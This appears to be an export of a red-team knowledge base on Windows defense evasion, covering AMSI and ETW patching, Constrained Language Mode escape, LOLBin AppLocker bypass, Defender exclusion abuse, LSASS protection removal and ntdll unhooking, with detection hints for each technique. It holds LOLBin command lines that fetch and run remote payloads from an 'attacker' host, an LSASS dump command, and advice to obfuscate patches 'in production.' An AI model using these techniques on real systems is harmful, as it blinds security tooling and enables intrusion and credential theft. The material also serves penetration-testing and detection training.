phase.title: Defense Bypass
phase.summary: PrivEsc-adjacent: AMSI patching, Constrained Language Mode escape, AppLocker / Defender enumeration. Treat as supporting context, not a primary path.

nodes.title: AMSI memory patching (Matt Graeber pattern)
nodes.summary: Patch AmsiScanBuffer in-process so PowerShell payloads stop being scanned.

snippets.title: Classic one-liner (signatured but works as a template)

nodes.detection_hints: Defender / EDR signatures the well-known string. Rotate the patch or use opaque reflection in production.
nodes.description_md:
AMSI (Antimalware Scan Interface) hooks into the PowerShell engine and other script hosts to scan content before execution. The Matt Graeber reflection technique sets the private static field `amsiInitFailed` to `true`, causing the `AmsiUtils` class to believe AMSI failed to initialize and skip all subsequent scans in the current PowerShell session.

**How it works**: PowerShell's AMSI integration checks `AmsiUtils.amsiInitFailed` before calling `AmsiScanBuffer`. Setting this field to `true` via .NET reflection bypasses AMSI for the lifetime of the process.

**Detection evasion**: The classic one-liner is heavily signatured. Use obfuscation:
- String concatenation: `'System.Management.Automation.A'+'msiUtils'`
- Character arrays: `[char[]]('A','m','s','i') -join ''`
- Environment variable expansion
- XOR-encoded strings decoded at runtime

**Scope**: Only affects the current PowerShell process. Does not disable AMSI for child processes or other hosts (JScript, VBScript, .NET).

nodes.title: Constrained Language Mode escape
nodes.summary: Break out of CLM via runspaces, Add-Type with C# source, or PSv2 downgrade where available.
nodes.description_md:
PowerShell Constrained Language Mode (CLM) restricts access to .NET types, COM objects, and PowerShell features like `Add-Type`. It is enforced by AppLocker/WDAC policy.

**Bypass methods**:

**1. PSv2 downgrade** (requires PS 2.0 installed):
```powershell
powershell.exe -version 2 -nop -ep bypass -c "..."
```
PS v2 has no AMSI and no CLM — but Windows 10 1607+ removes it by default.

**2. `Add-Type` with inline C#** (sometimes allowed in CLM):
If the policy is not enforced via WDAC/AppLocker but only via `$ExecutionContext.SessionState.LanguageMode`, certain .NET operations may still work.

**3. Runspaces**:
Create a runspace in a separate thread (`[runspacefactory]::CreateRunspace()`) that may have a different language mode.

**4. InstallUtil / MSBuild execution** — LOLBins that bypass AppLocker and often run in FullLanguage mode.

**5. PowerShell alternative hosts**: `pwsh.exe` (PS Core 6/7) may not enforce the same CLM policy.
nodes.detection_hints: PowerShell v2 execution (`powershell.exe -version 2`); runspace creation from constrained contexts; InstallUtil/MSBuild loading PS-related assemblies; CLM mode changes in session state.

nodes.title: AppLocker bypass (LOLBin paths)
nodes.summary: Use signed Microsoft binaries (LOLBins) to execute code where direct .exe execution is denied.
nodes.description_md:
AppLocker rules typically allow execution from `C:\Windows\` and `C:\Program Files\`, blocking unsigned executables from other paths. Living-off-the-land binaries (LOLBins) are Microsoft-signed executables in allowed paths that can be abused to execute attacker code.

**Key LOLBins for code execution**:
- `regsvr32 /s /n /u /i:http://attacker/s.sct scrobj.dll` — executes a remote COM scriptlet
- `mshta http://attacker/payload.hta` — executes HTA applications
- `msbuild.exe project.xml` — builds and executes inline C# from an XML project file
- `installutil.exe /logfile= /logtoconsole=false /u payload.exe` — runs `UninstallAction` code
- `rundll32.exe comsvcs.dll,MiniDump PID C:\Temp\dump.dmp full` — memory dumping
- `cmstp.exe /ni /s payload.inf` — INF file execution

**Writable AppLocker-allowed paths** (common):
- `C:\Windows\Tasks\`
- `C:\Windows\Temp\`
- `C:\Windows\tracing\`

Drop a binary into an allowed writable path to bypass path-based AppLocker rules.
nodes.detection_hints: Execution of LOLBins with unusual arguments (regsvr32 with /i:http://, msbuild with inline task); process creation from AppLocker-allowed writable paths; WDAC/AppLocker enforcement events.

nodes.title: Defender exclusion enumeration
nodes.summary: Excluded paths/extensions/processes are safe drop zones for tooling.
nodes.description_md:
Microsoft Defender maintains a list of exclusion paths, file extensions, and process names that bypass real-time scanning. Reading these exclusions via `Get-MpPreference` reveals locations where payloads can be dropped without triggering AV detection.

**Key properties from Get-MpPreference**:
- `ExclusionPath` — directories completely excluded from scanning
- `ExclusionExtension` — file extensions not scanned (e.g., `.ps1`, `.exe` in legacy configs)
- `ExclusionProcess` — processes whose reads/writes are excluded
- `ExclusionIpAddress` — network exclusions

**Operational use**: Drop tooling (WinPEAS, Mimikatz, Cobalt Strike implant) into an excluded path — it won't be scanned regardless of signature.

**Privilege requirement**: Reading exclusions requires admin or SYSTEM by default. However, specific registry keys for managed exclusions may be readable by lower-privilege users in some configurations.

**Alternative**: Even without reading exclusions, testing common default exclusions (`C:\Windows\Temp\`, `C:\ProgramData\`) may reveal unmonitored drops.
nodes.detection_hints: Defender management events (EID 5007 for config changes); high-value tools executed from excluded paths without detection; SIEM gaps in expected AV telemetry.

nodes.title: ETW patching
nodes.summary: Patch EtwEventWrite in-process to blind ETW-based telemetry.
nodes.description_md: Many EDRs consume **ETW** (especially the .NET and threat-intel providers). Patching `ntdll!EtwEventWrite` with a `ret` in your process suppresses those events for your tooling. In-memory only; pairs with AMSI patching.
nodes.detection_hints: RWX changes to ntdll EtwEventWrite; absence of expected ETW events from a known-active process.

snippets.title: Concept
snippets.code: # Resolve ntdll!EtwEventWrite, VirtualProtect RWX, write 0xC3 (ret), restore protection.

nodes.title: AMSI in-memory patch
nodes.summary: Patch AmsiScanBuffer so every scan returns clean.
nodes.description_md: Beyond string obfuscation, patch `amsi.dll!AmsiScanBuffer` in the current process to return `AMSI_RESULT_CLEAN`, neutralizing AMSI for subsequent script/assembly loads. The robust counterpart to the reflection trick.

snippets.title: Concept
snippets.code: # GetProcAddress(amsi.dll, AmsiScanBuffer) -> VirtualProtect RWX -> write stub that sets result=CLEAN and returns S_OK.

references.title: MITRE T1562.001 — Disable or Modify Tools

nodes.title: Add Defender exclusions
nodes.summary: With admin, exclude your working directory so payloads aren't scanned.
nodes.description_md: Once elevated, `Add-MpPreference -ExclusionPath` carves out a folder Defender ignores. Stage tooling there to run without real-time scanning. Loud (event 5007) but effective in labs.
nodes.detection_hints: Defender event 5007 (config change); new ExclusionPath/ExclusionProcess entries.

nodes.title: Disable Defender real-time protection
nodes.summary: Turn off real-time monitoring via policy/registry once at SYSTEM.
nodes.description_md: With SYSTEM (and tamper protection off), `Set-MpPreference -DisableRealtimeMonitoring` or the `Policies\...\Windows Defender` registry keys disable scanning. Very loud — last resort in a lab.

nodes.title: LOLBins for execution / allow-list bypass
nodes.summary: Signed Microsoft binaries proxy execution past application control.
nodes.description_md: **LOLBAS** binaries (e.g. `msbuild.exe`, `installutil.exe`, `regsvr32`, `mshta`, `rundll32`) execute attacker code while being Microsoft-signed — defeating naive allow-listing and many AppLocker rules.

nodes.title: PPL / LSASS protection bypass
nodes.summary: Defeat RunAsPPL to dump a protected LSASS.
nodes.description_md: When LSASS runs as a Protected Process Light, normal dumping fails. Loading a signed-but-vulnerable driver (BYOVD) can strip the protection so LSASS can be dumped. Driver-load is heavily monitored.

snippets.title: Approach
snippets.code: Load a signed but vulnerable driver to clear the EPROCESS protection bit on lsass.exe, then dump. Triggers driver-load + LSASS-access telemetry.

nodes.title: Unhook ntdll (fresh copy)
nodes.summary: Restore a clean ntdll .text to remove userland EDR hooks.
nodes.description_md: EDRs patch inline hooks into `ntdll` syscall stubs. Mapping a fresh copy of ntdll from disk (or KnownDlls) and restoring the `.text` section removes those hooks so syscalls run un-intercepted. Often paired with direct/indirect syscalls.

snippets.title: Approach
snippets.code:
1. Map \KnownDlls\ntdll.dll (clean)
2. Compare/restore the in-memory .text section of loaded ntdll
3. Resume with un-hooked syscall stubs

references.title: MITRE T1562.001 — Disable or Modify Tools
